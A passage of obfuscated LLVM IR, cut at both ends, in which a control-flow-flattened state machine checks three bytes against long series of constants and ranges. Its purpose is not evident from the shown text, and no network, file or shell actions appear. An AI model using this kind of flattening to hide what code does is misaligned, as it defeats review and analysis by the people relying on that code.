  br label %loopEnd

; <label>:1853:                                   ; preds = %loopEntry
  %1854 = load i8, i8* %2, align 1
  %1855 = zext i8 %1854 to i32
  %1856 = icmp eq i32 %1855, 66
  %1857 = select i1 %1856, i32 642509354, i32 -98159479
  store i32 %1857, i32* %switchVar
  br label %loopEnd

; <label>:1858:                                   ; preds = %loopEntry
  %1859 = load i8, i8* %3, align 1
  %1860 = zext i8 %1859 to i32
  %1861 = icmp eq i32 %1860, 151
  %1862 = select i1 %1861, i32 -848873157, i32 -98159479
  store i32 %1862, i32* %switchVar
  br label %loopEnd

; <label>:1863:                                   ; preds = %loopEntry
  %1864 = load i8, i8* %4, align 1
  %1865 = zext i8 %1864 to i32
  %1866 = icmp sge i32 %1865, 137
  %1867 = select i1 %1866, i32 668861270, i32 -98159479
  store i32 %1867, i32* %switchVar
  br label %loopEnd

; <label>:1868:                                   ; preds = %loopEntry
  %1869 = load i8, i8* %4, align 1
  %1870 = zext i8 %1869 to i32
  %1871 = icmp slt i32 %1870, 139
  %1872 = select i1 %1871, i32 1839754081, i32 -98159479
  store i32 %1872, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1873:                                   ; preds = %loopEntry
  %1874 = load i8, i8* %2, align 1
  %1875 = zext i8 %1874 to i32
  %1876 = icmp eq i32 %1875, 64
  %1877 = select i1 %1876, i32 -2105470198, i32 -929984780
  store i32 %1877, i32* %switchVar
  br label %loopEnd

; <label>:1878:                                   ; preds = %loopEntry
  %1879 = load i8, i8* %3, align 1
  %1880 = zext i8 %1879 to i32
  %1881 = icmp eq i32 %1880, 94
  %1882 = select i1 %1881, i32 -741293641, i32 -929984780
  store i32 %1882, i32* %switchVar
  br label %loopEnd

; <label>:1883:                                   ; preds = %loopEntry
  %1884 = load i8, i8* %4, align 1
  %1885 = zext i8 %1884 to i32
  %1886 = icmp sge i32 %1885, 237
  %1887 = select i1 %1886, i32 2018483450, i32 -929984780
  store i32 %1887, i32* %switchVar
  br label %loopEnd

; <label>:1888:                                   ; preds = %loopEntry
  %1889 = load i8, i8* %4, align 1
  %1890 = zext i8 %1889 to i32
  %1891 = icmp slt i32 %1890, 255
  %1892 = select i1 %1891, i32 1839754081, i32 -929984780
  store i32 %1892, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1893:                                   ; preds = %loopEntry
  %1894 = load i8, i8* %2, align 1
  %1895 = zext i8 %1894 to i32
  %1896 = icmp eq i32 %1895, 63
  %1897 = select i1 %1896, i32 294912594, i32 -74713848
  store i32 %1897, i32* %switchVar
  br label %loopEnd

; <label>:1898:                                   ; preds = %loopEntry
  %1899 = load i8, i8* %3, align 1
  %1900 = zext i8 %1899 to i32
  %1901 = icmp eq i32 %1900, 251
  %1902 = select i1 %1901, i32 -24028005, i32 -74713848
  store i32 %1902, i32* %switchVar
  br label %loopEnd

; <label>:1903:                                   ; preds = %loopEntry
  %1904 = load i8, i8* %4, align 1
  %1905 = zext i8 %1904 to i32
  %1906 = icmp sge i32 %1905, 19
  %1907 = select i1 %1906, i32 1979610042, i32 -74713848
  store i32 %1907, i32* %switchVar
  br label %loopEnd

; <label>:1908:                                   ; preds = %loopEntry
  %1909 = load i8, i8* %4, align 1
  %1910 = zext i8 %1909 to i32
  %1911 = icmp slt i32 %1910, 21
  %1912 = select i1 %1911, i32 1839754081, i32 -74713848
  store i32 %1912, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1913:                                   ; preds = %loopEntry
  %1914 = load i8, i8* %2, align 1
  %1915 = zext i8 %1914 to i32
  %1916 = icmp eq i32 %1915, 70
  %1917 = select i1 %1916, i32 1320728041, i32 -16709834
  store i32 %1917, i32* %switchVar
  br label %loopEnd

; <label>:1918:                                   ; preds = %loopEntry
  %1919 = load i8, i8* %3, align 1
  %1920 = zext i8 %1919 to i32
  %1921 = icmp eq i32 %1920, 42
  %1922 = select i1 %1921, i32 -1637839062, i32 -16709834
  store i32 %1922, i32* %switchVar
  br label %loopEnd

; <label>:1923:                                   ; preds = %loopEntry
  %1924 = load i8, i8* %4, align 1
  %1925 = zext i8 %1924 to i32
  %1926 = icmp sge i32 %1925, 73
  %1927 = select i1 %1926, i32 -698902695, i32 -16709834
  store i32 %1927, i32* %switchVar
  br label %loopEnd

; <label>:1928:                                   ; preds = %loopEntry
  %1929 = load i8, i8* %4, align 1
  %1930 = zext i8 %1929 to i32
  %1931 = icmp slt i32 %1930, 75
  %1932 = select i1 %1931, i32 1839754081, i32 -16709834
  store i32 %1932, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1933:                                   ; preds = %loopEntry
  %1934 = load i8, i8* %2, align 1
  %1935 = zext i8 %1934 to i32
  %1936 = icmp eq i32 %1935, 74
  %1937 = select i1 %1936, i32 1021826458, i32 -1720245468
  store i32 %1937, i32* %switchVar
  br label %loopEnd

; <label>:1938:                                   ; preds = %loopEntry
  %1939 = load i8, i8* %3, align 1
  %1940 = zext i8 %1939 to i32
  %1941 = icmp eq i32 %1940, 91
  %1942 = select i1 %1941, i32 1686708865, i32 -1720245468
  store i32 %1942, i32* %switchVar
  br label %loopEnd

; <label>:1943:                                   ; preds = %loopEntry
  %1944 = load i8, i8* %4, align 1
  %1945 = zext i8 %1944 to i32
  %1946 = icmp sge i32 %1945, 113
  %1947 = select i1 %1946, i32 269881623, i32 -1720245468
  store i32 %1947, i32* %switchVar
  br label %loopEnd

; <label>:1948:                                   ; preds = %loopEntry
  %1949 = load i8, i8* %4, align 1
  %1950 = zext i8 %1949 to i32
  %1951 = icmp slt i32 %1950, 115
  %1952 = select i1 %1951, i32 1839754081, i32 -1720245468
  store i32 %1952, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1953:                                   ; preds = %loopEntry
  %1954 = load i8, i8* %2, align 1
  %1955 = zext i8 %1954 to i32
  %1956 = icmp eq i32 %1955, 74
  %1957 = select i1 %1956, i32 -1826914494, i32 1538526059
  store i32 %1957, i32* %switchVar
  br label %loopEnd

; <label>:1958:                                   ; preds = %loopEntry
  %1959 = load i8, i8* %3, align 1
  %1960 = zext i8 %1959 to i32
  %1961 = icmp eq i32 %1960, 201
  %1962 = select i1 %1961, i32 -678823952, i32 1538526059
  store i32 %1962, i32* %switchVar
  br label %loopEnd

; <label>:1963:                                   ; preds = %loopEntry
  %1964 = load i8, i8* %4, align 1
  %1965 = zext i8 %1964 to i32
  %1966 = icmp sge i32 %1965, 56
  %1967 = select i1 %1966, i32 382736159, i32 1538526059
  store i32 %1967, i32* %switchVar
  br label %loopEnd

; <label>:1968:                                   ; preds = %loopEntry
  %1969 = load i8, i8* %4, align 1
  %1970 = zext i8 %1969 to i32
  %1971 = icmp slt i32 %1970, 58
  %1972 = select i1 %1971, i32 1839754081, i32 1538526059
  store i32 %1972, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1973:                                   ; preds = %loopEntry
  %1974 = load i8, i8* %2, align 1
  %1975 = zext i8 %1974 to i32
  %1976 = icmp eq i32 %1975, 188
  %1977 = select i1 %1976, i32 -1119793578, i32 -1342911860
  store i32 %1977, i32* %switchVar
  br label %loopEnd

; <label>:1978:                                   ; preds = %loopEntry
  %1979 = load i8, i8* %3, align 1
  %1980 = zext i8 %1979 to i32
  %1981 = icmp eq i32 %1980, 209
  %1982 = select i1 %1981, i32 -835866345, i32 -1342911860
  store i32 %1982, i32* %switchVar
  br label %loopEnd

; <label>:1983:                                   ; preds = %loopEntry
  %1984 = load i8, i8* %4, align 1
  %1985 = zext i8 %1984 to i32
  %1986 = icmp sge i32 %1985, 48
  %1987 = select i1 %1986, i32 -1148145683, i32 -1342911860
  store i32 %1987, i32* %switchVar
  br label %loopEnd

; <label>:1988:                                   ; preds = %loopEntry
  %1989 = load i8, i8* %4, align 1
  %1990 = zext i8 %1989 to i32
  %1991 = icmp slt i32 %1990, 53
  %1992 = select i1 %1991, i32 1839754081, i32 -1342911860
  store i32 %1992, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1993:                                   ; preds = %loopEntry
  %1994 = load i8, i8* %2, align 1
  %1995 = zext i8 %1994 to i32
  %1996 = icmp eq i32 %1995, 188
  %1997 = select i1 %1996, i32 265770948, i32 209722062
  store i32 %1997, i32* %switchVar
  br label %loopEnd

; <label>:1998:                                   ; preds = %loopEntry
  %1999 = load i8, i8* %3, align 1
  %2000 = zext i8 %1999 to i32
  %2001 = icmp eq i32 %2000, 165
  %2002 = select i1 %2001, i32 1839754081, i32 209722062
  store i32 %2002, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2003:                                   ; preds = %loopEntry
  %2004 = load i8, i8* %2, align 1
  %2005 = zext i8 %2004 to i32
  %2006 = icmp eq i32 %2005, 149
  %2007 = select i1 %2006, i32 856532430, i32 893946818
  store i32 %2007, i32* %switchVar
  br label %loopEnd

; <label>:2008:                                   ; preds = %loopEntry
  %2009 = load i8, i8* %3, align 1
  %2010 = zext i8 %2009 to i32
  %2011 = icmp eq i32 %2010, 202
  %2012 = select i1 %2011, i32 1839754081, i32 893946818
  store i32 %2012, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2013:                                   ; preds = %loopEntry
  %2014 = load i8, i8* %2, align 1
  %2015 = zext i8 %2014 to i32
  %2016 = icmp eq i32 %2015, 151
  %2017 = select i1 %2016, i32 -1394745655, i32 -1752919217
  store i32 %2017, i32* %switchVar
  br label %loopEnd

; <label>:2018:                                   ; preds = %loopEntry
  %2019 = load i8, i8* %3, align 1
  %2020 = zext i8 %2019 to i32
  %2021 = icmp eq i32 %2020, 80
  %2022 = select i1 %2021, i32 1839754081, i32 -1752919217
  store i32 %2022, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2023:                                   ; preds = %loopEntry
  %2024 = load i8, i8* %2, align 1
  %2025 = zext i8 %2024 to i32
  %2026 = icmp eq i32 %2025, 164
  %2027 = select i1 %2026, i32 -1541546271, i32 -1236275930
  store i32 %2027, i32* %switchVar
  br label %loopEnd

; <label>:2028:                                   ; preds = %loopEntry
  %2029 = load i8, i8* %3, align 1
  %2030 = zext i8 %2029 to i32
  %2031 = icmp eq i32 %2030, 132
  %2032 = select i1 %2031, i32 1839754081, i32 -1236275930
  store i32 %2032, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2033:                                   ; preds = %loopEntry
  %2034 = load i8, i8* %2, align 1
  %2035 = zext i8 %2034 to i32
  %2036 = icmp eq i32 %2035, 176
  %2037 = select i1 %2036, i32 2137863744, i32 1245755446
  store i32 %2037, i32* %switchVar
  br label %loopEnd

; <label>:2038:                                   ; preds = %loopEntry
  %2039 = load i8, i8* %3, align 1
  %2040 = zext i8 %2039 to i32
  %2041 = icmp eq i32 %2040, 31
  %2042 = select i1 %2041, i32 1839754081, i32 1245755446
  store i32 %2042, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2043:                                   ; preds = %loopEntry
  %2044 = load i8, i8* %2, align 1
  %2045 = zext i8 %2044 to i32
  %2046 = icmp eq i32 %2045, 167
  %2047 = select i1 %2046, i32 304461282, i32 -352078105
  store i32 %2047, i32* %switchVar
  br label %loopEnd

; <label>:2048:                                   ; preds = %loopEntry
  %2049 = load i8, i8* %3, align 1
  %2050 = zext i8 %2049 to i32
  %2051 = icmp eq i32 %2050, 114
  %2052 = select i1 %2051, i32 1839754081, i32 -352078105
  store i32 %2052, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2053:                                   ; preds = %loopEntry
  %2054 = load i8, i8* %2, align 1
  %2055 = zext i8 %2054 to i32
  %2056 = icmp eq i32 %2055, 178
  %2057 = select i1 %2056, i32 2010509319, i32 2038755662
  store i32 %2057, i32* %switchVar
  br label %loopEnd

; <label>:2058:                                   ; preds = %loopEntry
  %2059 = load i8, i8* %3, align 1
  %2060 = zext i8 %2059 to i32
  %2061 = icmp eq i32 %2060, 32
  %2062 = select i1 %2061, i32 1839754081, i32 2038755662
  store i32 %2062, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2063:                                   ; preds = %loopEntry
  %2064 = load i8, i8* %2, align 1
  %2065 = zext i8 %2064 to i32
  %2066 = icmp eq i32 %2065, 178
  %2067 = select i1 %2066, i32 1598762833, i32 337144242
  store i32 %2067, i32* %switchVar
  br label %loopEnd

; <label>:2068:                                   ; preds = %loopEntry
  %2069 = load i8, i8* %3, align 1
  %2070 = zext i8 %2069 to i32
  %2071 = icmp eq i32 %2070, 33
  %2072 = select i1 %2071, i32 1839754081, i32 337144242
  store i32 %2072, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2073:                                   ; preds = %loopEntry
  %2074 = load i8, i8* %2, align 1
  %2075 = zext i8 %2074 to i32
  %2076 = icmp eq i32 %2075, 37
  %2077 = select i1 %2076, i32 -2101484438, i32 1626095381
  store i32 %2077, i32* %switchVar
  br label %loopEnd

; <label>:2078:                                   ; preds = %loopEntry
  %2079 = load i8, i8* %3, align 1
  %2080 = zext i8 %2079 to i32
  %2081 = icmp eq i32 %2080, 59
  %2082 = select i1 %2081, i32 1839754081, i32 1626095381
  store i32 %2082, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2083:                                   ; preds = %loopEntry
  %2084 = load i8, i8* %2, align 1
  %2085 = zext i8 %2084 to i32
  %2086 = icmp eq i32 %2085, 37
  %2087 = select i1 %2086, i32 566094961, i32 -1036091355
  store i32 %2087, i32* %switchVar
  br label %loopEnd

; <label>:2088:                                   ; preds = %loopEntry
  %2089 = load i8, i8* %3, align 1
  %2090 = zext i8 %2089 to i32
  %2091 = icmp eq i32 %2090, 187
  %2092 = select i1 %2091, i32 1839754081, i32 -1036091355
  store i32 %2092, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2093:                                   ; preds = %loopEntry
  %2094 = load i8, i8* %2, align 1
  %2095 = zext i8 %2094 to i32
  %2096 = icmp eq i32 %2095, 46
  %2097 = select i1 %2096, i32 261938107, i32 713886707
  store i32 %2097, i32* %switchVar
  br label %loopEnd

; <label>:2098:                                   ; preds = %loopEntry
  %2099 = load i8, i8* %3, align 1
  %2100 = zext i8 %2099 to i32
  %2101 = icmp eq i32 %2100, 105
  %2102 = select i1 %2101, i32 1839754081, i32 713886707
  store i32 %2102, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2103:                                   ; preds = %loopEntry
  %2104 = load i8, i8* %2, align 1
  %2105 = zext i8 %2104 to i32
  %2106 = icmp eq i32 %2105, 51
  %2107 = select i1 %2106, i32 -1366945578, i32 -298947767
  store i32 %2107, i32* %switchVar
  br label %loopEnd

; <label>:2108:                                   ; preds = %loopEntry
  %2109 = load i8, i8* %3, align 1
  %2110 = zext i8 %2109 to i32
  %2111 = icmp eq i32 %2110, 254
  %2112 = select i1 %2111, i32 1839754081, i32 -298947767
  store i32 %2112, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2113:                                   ; preds = %loopEntry
  %2114 = load i8, i8* %2, align 1
  %2115 = zext i8 %2114 to i32
  %2116 = icmp eq i32 %2115, 51
  %2117 = select i1 %2116, i32 43335116, i32 -131390907
  store i32 %2117, i32* %switchVar
  br label %loopEnd

; <label>:2118:                                   ; preds = %loopEntry
  %2119 = load i8, i8* %3, align 1
  %2120 = zext i8 %2119 to i32
  %2121 = icmp eq i32 %2120, 255
  %2122 = select i1 %2121, i32 1839754081, i32 -131390907
  store i32 %2122, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2123:                                   ; preds = %loopEntry
  %2124 = load i8, i8* %2, align 1
  %2125 = zext i8 %2124 to i32
  %2126 = icmp eq i32 %2125, 5
  %2127 = select i1 %2126, i32 958878063, i32 -777889711
  store i32 %2127, i32* %switchVar
  br label %loopEnd

; <label>:2128:                                   ; preds = %loopEntry
  %2129 = load i8, i8* %3, align 1
  %2130 = zext i8 %2129 to i32
  %2131 = icmp eq i32 %2130, 135
  %2132 = select i1 %2131, i32 1839754081, i32 -777889711
  store i32 %2132, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2133:                                   ; preds = %loopEntry
  %2134 = load i8, i8* %2, align 1
  %2135 = zext i8 %2134 to i32
  %2136 = icmp eq i32 %2135, 5
  %2137 = select i1 %2136, i32 -1513608242, i32 -1811332985
  store i32 %2137, i32* %switchVar
  br label %loopEnd

; <label>:2138:                                   ; preds = %loopEntry
  %2139 = load i8, i8* %3, align 1
  %2140 = zext i8 %2139 to i32
  %2141 = icmp eq i32 %2140, 196
  %2142 = select i1 %2141, i32 1839754081, i32 -1811332985
  store i32 %2142, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2143:                                   ; preds = %loopEntry
  %2144 = load i8, i8* %2, align 1
  %2145 = zext i8 %2144 to i32
  %2146 = icmp eq i32 %2145, 5
  %2147 = select i1 %2146, i32 980827379, i32 -1246768723
  store i32 %2147, i32* %switchVar
  br label %loopEnd

; <label>:2148:                                   ; preds = %loopEntry
  %2149 = load i8, i8* %3, align 1
  %2150 = zext i8 %2149 to i32
  %2151 = icmp eq i32 %2150, 39
  %2152 = select i1 %2151, i32 1839754081, i32 -1246768723
  store i32 %2152, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2153:                                   ; preds = %loopEntry
  %2154 = load i8, i8* %2, align 1
  %2155 = zext i8 %2154 to i32
  %2156 = icmp eq i32 %2155, 91
  %2157 = select i1 %2156, i32 -31288960, i32 1550474231
  store i32 %2157, i32* %switchVar
  br label %loopEnd

; <label>:2158:                                   ; preds = %loopEntry
  %2159 = load i8, i8* %3, align 1
  %2160 = zext i8 %2159 to i32
  %2161 = icmp eq i32 %2160, 134
  %2162 = select i1 %2161, i32 1839754081, i32 1550474231
  store i32 %2162, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2163:                                   ; preds = %loopEntry
  %2164 = load i8, i8* %2, align 1
  %2165 = zext i8 %2164 to i32
  %2166 = icmp eq i32 %2165, 104
  %2167 = select i1 %2166, i32 -573623237, i32 -1673810284
  store i32 %2167, i32* %switchVar
  br label %loopEnd

; <label>:2168:                                   ; preds = %loopEntry
  %2169 = load i8, i8* %3, align 1
  %2170 = zext i8 %2169 to i32
  %2171 = icmp eq i32 %2170, 200
  %2172 = select i1 %2171, i32 -860641718, i32 -1673810284
  store i32 %2172, i32* %switchVar
  br label %loopEnd

; <label>:2173:                                   ; preds = %loopEntry
  %2174 = load i8, i8* %4, align 1
  %2175 = zext i8 %2174 to i32
  %2176 = icmp sge i32 %2175, 128
  %2177 = select i1 %2176, i32 -2051461382, i32 -1673810284
  store i32 %2177, i32* %switchVar
  br label %loopEnd

; <label>:2178:                                   ; preds = %loopEntry
  %2179 = load i8, i8* %4, align 1
  %2180 = zext i8 %2179 to i32
  %2181 = icmp slt i32 %2180, 159
  %2182 = select i1 %2181, i32 1839754081, i32 -1673810284
  store i32 %2182, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2183:                                   ; preds = %loopEntry
  %2184 = load i8, i8* %2, align 1
  %2185 = zext i8 %2184 to i32
  %2186 = icmp eq i32 %2185, 107
  %2187 = select i1 %2186, i32 894558408, i32 2037425044
  store i32 %2187, i32* %switchVar
  br label %loopEnd

; <label>:2188:                                   ; preds = %loopEntry
  %2189 = load i8, i8* %3, align 1
  %2190 = zext i8 %2189 to i32
  %2191 = icmp eq i32 %2190, 152
  %2192 = select i1 %2191, i32 -946504490, i32 2037425044
  store i32 %2192, i32* %switchVar
  br label %loopEnd

; <label>:2193:                                   ; preds = %loopEntry
  %2194 = load i8, i8* %4, align 1
  %2195 = zext i8 %2194 to i32
  %2196 = icmp sge i32 %2195, 96
  %2197 = select i1 %2196, i32 864958201, i32 2037425044
  store i32 %2197, i32* %switchVar
  br label %loopEnd

; <label>:2198:                                   ; preds = %loopEntry
  %2199 = load i8, i8* %4, align 1
  %2200 = zext i8 %2199 to i32
  %2201 = icmp slt i32 %2200, 111
  %2202 = select i1 %2201, i32 1839754081, i32 2037425044
  store i32 %2202, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2203:                                   ; preds = %loopEntry
  %2204 = load i8, i8* %2, align 1
  %2205 = zext i8 %2204 to i32
  %2206 = icmp eq i32 %2205, 107
  %2207 = select i1 %2206, i32 -864593151, i32 -399484337
  store i32 %2207, i32* %switchVar
  br label %loopEnd

; <label>:2208:                                   ; preds = %loopEntry
  %2209 = load i8, i8* %3, align 1
  %2210 = zext i8 %2209 to i32
  %2211 = icmp eq i32 %2210, 181
  %2212 = select i1 %2211, i32 -1386108308, i32 -399484337
  store i32 %2212, i32* %switchVar
  br label %loopEnd

; <label>:2213:                                   ; preds = %loopEntry
  %2214 = load i8, i8* %4, align 1
  %2215 = zext i8 %2214 to i32
  %2216 = icmp sge i32 %2215, 160
  %2217 = select i1 %2216, i32 1030556501, i32 -399484337
  store i32 %2217, i32* %switchVar
  br label %loopEnd

; <label>:2218:                                   ; preds = %loopEntry
  %2219 = load i8, i8* %4, align 1
  %2220 = zext i8 %2219 to i32
  %2221 = icmp slt i32 %2220, 189
  %2222 = select i1 %2221, i32 1839754081, i32 -399484337
  store i32 %2222, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2223:                                   ; preds = %loopEntry
  %2224 = load i8, i8* %2, align 1
  %2225 = zext i8 %2224 to i32
  %2226 = icmp eq i32 %2225, 172
  %2227 = select i1 %2226, i32 13561654, i32 1146118748
  store i32 %2227, i32* %switchVar
  br label %loopEnd

; <label>:2228:                                   ; preds = %loopEntry
  %2229 = load i8, i8* %3, align 1
  %2230 = zext i8 %2229 to i32
  %2231 = icmp eq i32 %2230, 98
  %2232 = select i1 %2231, i32 1645749844, i32 1146118748
  store i32 %2232, i32* %switchVar
  br label %loopEnd

; <label>:2233:                                   ; preds = %loopEntry
  %2234 = load i8, i8* %4, align 1
  %2235 = zext i8 %2234 to i32
  %2236 = icmp sge i32 %2235, 64
  %2237 = select i1 %2236, i32 -1066752965, i32 1146118748
  store i32 %2237, i32* %switchVar
  br label %loopEnd

; <label>:2238:                                   ; preds = %loopEntry
  %2239 = load i8, i8* %4, align 1
  %2240 = zext i8 %2239 to i32
  %2241 = icmp slt i32 %2240, 95
  %2242 = select i1 %2241, i32 1839754081, i32 1146118748
  store i32 %2242, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2243:                                   ; preds = %loopEntry
  %2244 = load i8, i8* %2, align 1
  %2245 = zext i8 %2244 to i32
  %2246 = icmp eq i32 %2245, 184
  %2247 = select i1 %2246, i32 -1910958790, i32 193614505
  store i32 %2247, i32* %switchVar
  br label %loopEnd

; <label>:2248:                                   ; preds = %loopEntry
  %2249 = load i8, i8* %3, align 1
  %2250 = zext i8 %2249 to i32
  %2251 = icmp eq i32 %2250, 170
  %2252 = select i1 %2251, i32 718300386, i32 193614505
  store i32 %2252, i32* %switchVar
  br label %loopEnd

; <label>:2253:                                   ; preds = %loopEntry
  %2254 = load i8, i8* %4, align 1
  %2255 = zext i8 %2254 to i32
  %2256 = icmp sge i32 %2255, 240
  %2257 = select i1 %2256, i32 -1518951031, i32 193614505
  store i32 %2257, i32* %switchVar
  br label %loopEnd

; <label>:2258:                                   ; preds = %loopEntry
  %2259 = load i8, i8* %4, align 1
  %2260 = zext i8 %2259 to i32
  %2261 = icmp slt i32 %2260, 255
  %2262 = select i1 %2261, i32 1839754081, i32 193614505
  store i32 %2262, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2263:                                   ; preds = %loopEntry
  %2264 = load i8, i8* %2, align 1
  %2265 = zext i8 %2264 to i32
  %2266 = icmp eq i32 %2265, 192
  %2267 = select i1 %2266, i32 1924017880, i32 1077903947
  store i32 %2267, i32* %switchVar
  br label %loopEnd

; <label>:2268:                                   ; preds = %loopEntry
  %2269 = load i8, i8* %3, align 1
  %2270 = zext i8 %2269 to i32
  %2271 = icmp eq i32 %2270, 111
  %2272 = select i1 %2271, i32 -1652767010, i32 1077903947
  store i32 %2272, i32* %switchVar
  br label %loopEnd

; <label>:2273:                                   ; preds = %loopEntry
  %2274 = load i8, i8* %4, align 1
  %2275 = zext i8 %2274 to i32
  %2276 = icmp sge i32 %2275, 128
  %2277 = select i1 %2276, i32 -20492473, i32 1077903947
  store i32 %2277, i32* %switchVar
  br label %loopEnd

; <label>:2278:                                   ; preds = %loopEntry
  %2279 = load i8, i8* %4, align 1
  %2280 = zext i8 %2279 to i32
  %2281 = icmp slt i32 %2280, 143
  %2282 = select i1 %2281, i32 1839754081, i32 1077903947
  store i32 %2282, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2283:                                   ; preds = %loopEntry
  %2284 = load i8, i8* %2, align 1
  %2285 = zext i8 %2284 to i32
  %2286 = icmp eq i32 %2285, 192
  %2287 = select i1 %2286, i32 547039613, i32 1727550516
  store i32 %2287, i32* %switchVar
  br label %loopEnd

; <label>:2288:                                   ; preds = %loopEntry
  %2289 = load i8, i8* %3, align 1
  %2290 = zext i8 %2289 to i32
  %2291 = icmp eq i32 %2290, 252
  %2292 = select i1 %2291, i32 -671412553, i32 1727550516
  store i32 %2292, i32* %switchVar
  br label %loopEnd

; <label>:2293:                                   ; preds = %loopEntry
  %2294 = load i8, i8* %4, align 1
  %2295 = zext i8 %2294 to i32
  %2296 = icmp sge i32 %2295, 208
  %2297 = select i1 %2296, i32 1497595639, i32 1727550516
  store i32 %2297, i32* %switchVar
  br label %loopEnd

; <label>:2298:                                   ; preds = %loopEntry
  %2299 = load i8, i8* %4, align 1
  %2300 = zext i8 %2299 to i32
  %2301 = icmp slt i32 %2300, 223
  %2302 = select i1 %2301, i32 1839754081, i32 1727550516
  store i32 %2302, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2303:                                   ; preds = %loopEntry
  %2304 = load i8, i8* %2, align 1
  %2305 = zext i8 %2304 to i32
  %2306 = icmp eq i32 %2305, 192
  %2307 = select i1 %2306, i32 -454950990, i32 749795254
  store i32 %2307, i32* %switchVar
  br label %loopEnd

; <label>:2308:                                   ; preds = %loopEntry
  %2309 = load i8, i8* %3, align 1
  %2310 = zext i8 %2309 to i32
  %2311 = icmp eq i32 %2310, 40
  %2312 = select i1 %2311, i32 -1452004351, i32 749795254
  store i32 %2312, i32* %switchVar
  br label %loopEnd

; <label>:2313:                                   ; preds = %loopEntry
  %2314 = load i8, i8* %4, align 1
  %2315 = zext i8 %2314 to i32
  %2316 = icmp sge i32 %2315, 56
  %2317 = select i1 %2316, i32 -685801699, i32 749795254
  store i32 %2317, i32* %switchVar
  br label %loopEnd

; <label>:2318:                                   ; preds = %loopEntry
  %2319 = load i8, i8* %4, align 1
  %2320 = zext i8 %2319 to i32
  %2321 = icmp slt i32 %2320, 59
  %2322 = select i1 %2321, i32 1839754081, i32 749795254
  store i32 %2322, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2323:                                   ; preds = %loopEntry
  %2324 = load i8, i8* %2, align 1
  %2325 = zext i8 %2324 to i32
  %2326 = icmp eq i32 %2325, 198
  %2327 = select i1 %2326, i32 -1116407870, i32 -983542020
  store i32 %2327, i32* %switchVar
  br label %loopEnd

; <label>:2328:                                   ; preds = %loopEntry
  %2329 = load i8, i8* %3, align 1
  %2330 = zext i8 %2329 to i32
  %2331 = icmp eq i32 %2330, 8
  %2332 = select i1 %2331, i32 -1642019990, i32 -983542020
  store i32 %2332, i32* %switchVar
  br label %loopEnd

; <label>:2333:                                   ; preds = %loopEntry
  %2334 = load i8, i8* %4, align 1
  %2335 = zext i8 %2334 to i32
  %2336 = icmp sge i32 %2335, 81
  %2337 = select i1 %2336, i32 -731207375, i32 -983542020
  store i32 %2337, i32* %switchVar
  br label %loopEnd

; <label>:2338:                                   ; preds = %loopEntry
  %2339 = load i8, i8* %4, align 1
  %2340 = zext i8 %2339 to i32
  %2341 = icmp slt i32 %2340, 95
  %2342 = select i1 %2341, i32 1839754081, i32 -983542020
  store i32 %2342, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2343:                                   ; preds = %loopEntry
  %2344 = load i8, i8* %2, align 1
  %2345 = zext i8 %2344 to i32
  %2346 = icmp eq i32 %2345, 199
  %2347 = select i1 %2346, i32 1734832982, i32 1096913761
  store i32 %2347, i32* %switchVar
  br label %loopEnd

; <label>:2348:                                   ; preds = %loopEntry
  %2349 = load i8, i8* %3, align 1
  %2350 = zext i8 %2349 to i32
  %2351 = icmp eq i32 %2350, 116
  %2352 = select i1 %2351, i32 1672754746, i32 1096913761
  store i32 %2352, i32* %switchVar
  br label %loopEnd

; <label>:2353:                                   ; preds = %loopEntry
  %2354 = load i8, i8* %4, align 1
  %2355 = zext i8 %2354 to i32
  %2356 = icmp sge i32 %2355, 112
  %2357 = select i1 %2356, i32 -900518505, i32 1096913761
  store i32 %2357, i32* %switchVar
  br label %loopEnd

; <label>:2358:                                   ; preds = %loopEntry
  %2359 = load i8, i8* %4, align 1
  %2360 = zext i8 %2359 to i32
  %2361 = icmp slt i32 %2360, 119
  %2362 = select i1 %2361, i32 1839754081, i32 1096913761
  store i32 %2362, i32* %switchVar
